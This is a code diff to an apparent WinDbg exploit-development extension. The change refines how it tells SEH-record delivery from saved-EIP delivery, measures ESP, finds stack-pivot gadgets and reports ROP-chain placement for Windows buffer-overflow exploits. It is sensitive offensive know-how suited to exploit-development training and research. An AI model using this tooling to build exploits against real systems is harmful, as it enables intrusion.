@@ -3627,7 +3627,7 @@ function bindApi(): OsedApi {
     const module = findModuleByAddress(BigInt(address));
     return module !== undefined && takesSehHandler(module).ok;
   };
-  const sehDelivery = (crash: SehCrash, corpus: CapabilityIndex | undefined): Delivery => {
+  const sehDelivery = (crash: SehCrash, corpus: CapabilityIndex | undefined): Extract<Delivery, { kind: "seh" }> => {
     const candidates = handlerCandidates(corpus?.gadgets ?? [], takesHandlers);
     const { tail, how: tailHow } = measureTail(crash.record, readByte);
     const base = { kind: "seh" as const, record: crash.record, handler: crash.handler, tail, tailHow };
@@ -3639,8 +3639,8 @@ function bindApi(): OsedApi {
   };
   // [6/7]'s evidence for an SEH delivery: why it is one, why pop pop ret is not the handler, the measured
   // ESP, and the handlers that land in the buffer.
-  const printSehDelivery = (delivery: Extract<Delivery, { kind: "seh" }>, crash: SehCrash): void => {
-    out.info(`Delivered through the SEH record, not a saved EIP: EIP ${dwordHex(crash.eip)} is in ${crash.eipModule}, and the first record, at ${dwordHex(delivery.record)}, holds handler ${dwordHex(delivery.handler)}, which is in no module (!exchain).`);
+  const printSehDelivery = (delivery: Extract<Delivery, { kind: "seh" }>, crash: SehCrash, taken: boolean): void => {
+    out.info(`${taken ? "Delivered through the SEH record, not a saved EIP" : "The overflow reached an SEH record as well"}: EIP ${dwordHex(crash.eip)} is in ${crash.eipModule}, and the first record, at ${dwordHex(delivery.record)}, holds handler ${dwordHex(delivery.handler)}, which is in no module (!exchain).`);
     const page = memoryRegion(BigInt(delivery.record));
     out.info(`Not pop pop ret: it returns into the record itself, ${page.executable === false ? "on a page that does not execute" : "on the stack"} (!vprot ${dwordHex(delivery.record)}). The handler moves ESP into the buffer instead.`);
     const { handlerEsp } = delivery;
@@ -3648,7 +3648,7 @@ function bindApi(): OsedApi {
     else {
       out.info(`ESP when the handler runs: ${dwordHex(handlerEsp)}, the record 0x${delivery.sehEsp.toString(16).toUpperCase()} above it. Measured: ${delivery.how}.`);
       out.info(`Reproduce: ${delivery.reproduce}`);
-      if (delivery.pivots.length === 0) out.warn(`No handler lands between the faulting ESP ${dwordHex(crash.esp)} and the record: dx @$osed().rop.pivots()`);
+      if (delivery.pivots.length === 0) out.warn(`No handler lands between the faulting ESP ${dwordHex(crash.esp)} and the record, so the chain goes on the saved EIP instead. If this target's function never returns, the missing piece is one gadget that adds between 0x${((crash.esp - handlerEsp) >>> 0).toString(16).toUpperCase()} and 0x${delivery.sehEsp.toString(16).toUpperCase()} to ESP and returns: dx @$osed().rop.pivots()`);
       for (const pivot of delivery.pivots.slice(0, 3)) {
         out.info(`  ${dwordHex(pivot.address)}  ${pivot.sequence}: its ret lands 0x${(delivery.sehEsp - pivot.land).toString(16).toUpperCase()} below the record, at OFFSET - 0x${(delivery.sehEsp - pivot.land).toString(16).toUpperCase()}`);
       }
@@ -3932,7 +3932,16 @@ function bindApi(): OsedApi {
       return bytes && bytes.length === 4 ? (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0 : undefined;
     });
     // An SEH crash is read now too, and measured last of all: measuring lets the exception through once.
-    const delivery: Delivery = sehCrash && solved ? sehDelivery(sehCrash, corpus) : { kind: "ret" };
+    //
+    // Looking like an SEH crash is not the same as being delivered through one. Any overflow long enough
+    // to fault inside the program while it reaches a record up the stack looks like this: EIP is still in
+    // a module and the first handler holds the padding byte. T01 is that shape and its route is the saved
+    // EIP. What separates them is whether the delivery can be completed, which is a measurement: a
+    // handler whose ret lands above the ESP the target faulted with and below the record, so it reads a
+    // dword the overflow wrote. Where none does, the saved EIP stands and [6/7] says the record was
+    // overwritten too, rather than laying a chain nothing can reach.
+    const seh = sehCrash && solved ? sehDelivery(sehCrash, corpus) : undefined;
+    const delivery: Delivery = seh && seh.pivots.length > 0 ? seh : { kind: "ret" };
     // The loaders search the corpus without the excluded gadgets, so one cannot come back under another name.
     const build = buildExploit({
       api: depApi, style, module: modulesLabel, badchars: badchars as number[], index: corpus, plans,
@@ -4002,8 +4011,8 @@ function bindApi(): OsedApi {
         // frame sits in the program's own memory between the write and the call.
         out.warn("A run of zero, int3 or nop bytes in a writable section. Nothing here proves the program never writes there.");
       } else if (style === "staged") for (const line of solved?.unavailable ?? []) out.warn(line);
-      if (delivery.kind === "seh") printSehDelivery(delivery, sehCrash!);
-      else {
+      if (seh) printSehDelivery(seh, sehCrash!, delivery.kind === "seh");
+      if (delivery.kind !== "seh") {
         out[landing.measured ? "info" : "warn"](`ESP after the crashing ret: ${landing.how}.`);
         out[landing.measured ? "info" : "warn"](!landing.measured ? "Run dep_plan at the crash, or find the EIP dword with dds esp-10 L8 and set RET_GAP."
           : landing.gap === 0 ? "The chain's second dword sits right after EIP." : `The chain's second dword sits at OFFSET + ${4 + landing.gap}: RET_GAP puts ${landing.gap} junk bytes after the first gadget.`);
